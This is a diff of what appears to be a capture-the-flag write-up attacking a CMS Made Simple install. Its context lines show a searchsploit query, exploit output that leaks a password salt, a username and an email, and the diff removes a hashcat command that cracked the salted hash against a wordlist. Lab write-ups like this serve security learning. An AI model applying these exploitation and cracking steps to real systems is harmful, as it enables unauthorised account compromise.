@@ -24,6 +24,8 @@ searchsploit "cms made simple"
 Copy the exploit and run it with python and the variables it needs. 
 
 ```
+
+
 [+] Salt for password found: 932129a6bd8545bd
 [+] Username found: christophe
 [+] Email found: christophe@christophe.local
@@ -32,6 +34,4 @@ Copy the exploit and run it with python and the variables it needs.
 
 Crack the password
 
-```
-hashcat -O -a 0 -m 20 7908b1494f82ed320b288a0e839bfbc5:932129a6bd8545bd /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
-```
+
